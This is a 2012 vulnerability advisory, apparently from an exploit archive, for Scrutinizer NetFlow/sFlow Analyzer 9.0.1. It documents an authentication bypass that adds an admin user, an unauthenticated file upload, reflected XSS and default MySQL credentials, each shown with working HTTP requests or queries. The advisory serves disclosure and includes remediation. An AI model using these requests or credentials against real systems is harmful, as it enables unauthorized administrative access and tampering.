@@ -1,0 +1,218 @@
+id: 19079
+date: 07/30/2012
+title: Scrutinizer NetFlow / sFlow Analyzer 9.0.1 XSS / Bypass / File Upload
+author: Mario Ceballos
+cves: 
+
+Vendor: Plixer International (http://www.plixer.com)
+Product: Scrutinizer NetFlow and sFlow Analyzer
+Version affected: Confirmed 9.0.1 (Build 9.0.1.19899) and prior versions
+may be affected as well. Please note that the software can be found in a
+long list of other products. Visit http://www.plixer.com/Scrutinizer-Netflow-Sflow/scrutinizer.html
+for the partial list.
+
+Product description:
+Network analysis tool for monitoring the overall network health and reports
+on which hosts, applications, protocols, etc. that are consuming network
+bandwidth.
+
+Credits:
+Mario Ceballos of the Metasploit Project
+Jonathan Claudius of Trustwave Spiderlabs
+
+Finding 1: HTTP Authentication Bypass Vulnerability
+CVE: CVE-2012-2626
+
+The Scrutinizer web console provides a form-based login facility, requiring
+users to authenticate to gain access to further functionality. A tiered
+user access model is also used, where administrative and standard users
+have a different selection of permissible functions. Authentication and
+authorization is controlled by the cookie-based session management system.
+Although this is implemented in a standardized way, the session tokens are
+not required to perform privileged functions, such as adding users.
+
+Example(s):
+
+This request will add a user named "trustwave" with the password of
+"trustwave" to the administrative user group.
+
+#Request
+POST /cgi-bin/admin.cgi HTTP/1.1
+Host: A.B.C.D
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:11.0) Gecko/20100101 Firefox/11.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Content-Length: 70
+
+tool=userprefs&newUser=trustwave&pwd=trustwave&selectedUserGroup=1
+
+#Response
+HTTP/1.1 200 OK
+Date: Wed, 25 Apr 2012 17:52:15 GMT
+Server: Apache
+Vary: Accept-Encoding
+Content-Length: 19
+Content-Type: text/html; charset=utf-8
+
+{"new_user_id":"2"}
+
+
+Finding 2: Arbitrary File Upload Vulnerability
+CVE: CVE-2012-2627
+
+The Scrutinizer web console is prone to unauthenticated arbitrary file upload
+vulnerability.  An attacker could exploit this vulnerability to upload files
+to the affected systems file system as well as overwrite the Scrutinizer
+applications SNMP configuration.
+
+Example(s):
+
+This request will upload a test file to the following location:
+
+'C:\Program Files (x86)\Scrutinizer\snmp\mibs\trustwave.txt'
+
+Note: This affected folder also contains SNMP configuration files which could
+be overwritten if an attacker were to select the right file name.
+
+#Request
+POST /d4d/uploader.php HTTP/1.0
+Host: A.B.C.D
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Content-Type: multipart/form-data; boundary=_Part_949_3365333252_3066945593
+Content-Length: 210
+
+
+--_Part_949_3365333252_3066945593
+Content-Disposition: form-data;
+name="uploadedfile"; filename="trustwave.txt"
+Content-Type: application/octet-stream
+
+trustwave
+
+--_Part_949_3365333252_3066945593--
+
+#Response
+HTTP/1.1 200 OK
+Date: Wed, 25 Apr 2012 17:39:15 GMT
+Server: Apache
+X-Powered-By: PHP/5.3.3
+Vary: Accept-Encoding
+Content-Length: 41
+Connection: close
+Content-Type: text/html
+
+{"success":1,"file_name":"trustwave.txt"}
+
+#Confirming on File System
+C:\>type "Program Files (x86)\Scrutinizer\snmp\mibs\trustwave.txt"
+trustwave
+
+
+Finding 3: Multiple Cross-site Scripting Vulnerabilities in exporters.php and contextMenu.php
+CVE: CVE-2012-3848
+
+The Scrutinizer web console suffers from multiple Cross Site Scripting
+vulnerabilities in the following pages:
+
+1.) /d4d/contextMenu.php
+2.) /d4d/exporters.php
+
+These vulnerabilities include the following:
+
+1.) XSS via arbitrary parameter
+3.) XSS via referrer header
+
+Example(s):
+
+The following two examples will demonstrate the the above mentioned vulnerabilities on exporters.php
+
+#Request 1
+GET /d4d/exporters.php?a<script>alert(123)</script>=1 HTTP/1.1
+Host: A.B.C.D
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:12.0) Gecko/20100101 Firefox/12.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+
+#Response 1
+<snip>
+<a href="/d4d/exporters.php?a<script>alert(1)</script>=1">/d4d/exporters.php?a<script>alert(123)</script>=1</a></td></tr>
+<snip>
+
+#Request 2
+GET /d4d/exporters.php HTTP/1.1
+Host: A.B.C.D
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)
+Connection: close
+Referer: http://D.E.F.G/search?hl=en&q=a<script>alert(123)</script>=1
+Content-Length: 2
+
+#Response 2
+<snip>
+<a href="http://D.E.F.G/search?hl=en&q=a<script>alert(123)</script>=1">http://D.E.F.G/search?hl=en&q=a<script>alert(123)</script>=1</a>
+<snip>
+
+Finding 4: Undocumented Default Admin MySQL Users
+CVE: CVE-2012-3951
+
+The Scrutinizer application relies on an underlying Apache, MySQL and PHP
+installation which is installed as part of the scrutinizer installer
+package.  The installation of these packages are transparent to the user
+during the Scrutinizer installation.
+
+The installation selects default passwords for internal MySQL Users which
+are not configured by the user which could be easily guessed by an
+attacker.  There is currently no way to change these values within the
+Scrutinizer application and changing them manually in the MySQL instance
+has unknown effects on the application due to hardcoded values for some of
+these accounts.
+
+Example(s):
+
+The following MySQL command can be run to see the users and their relative
+passwords:
+
+#Request
+select User,Password from mysql.user;
+
+#Response
+User          |Password
+root          |
+root          |
+scrutinizer   |*4ACFE3202A5FF5CF467898FC58AAB1D615029441
+scrutremote   |*4ACFE3202A5FF5CF467898FC58AAB1D615029441
+
+Note 1: the above hash shared between the 'scrutinizer' and 'scrutremote'
+users is equivalent to 'admin'
+
+Note 2: the 'scrutinizer' and 'scrutremote' users have select, update,
+delete, create, drop, and more permissions within the MySQL instance.
+
+Note 3: By default, the MySQL instance is bound to "0.0.0.0", the
+equivalent of every network interface on the system allowing users with the
+proper access rights to interact directly with the MySQL instance.
+
+
+Remediation Steps:
+Customers should update to the latest version of Scrutinizer NetFlow &
+sFlow Analyzer in order to address findings 1, 2 and 3. These issues have been
+corrected in version 9.5.0.
+
+Revision History:
+05/02/12 - Vulnerability disclosed
+05/16/12 - Patch released by vendor
+07/11/12 - Vendor publishes announcement
+07/27/12 - Advisory published
+
+References
+1. http://www.plixer.com
+2. http://blog.spiderlabs.com
+
+
+
+#  0day.today [2023-03-23]  #
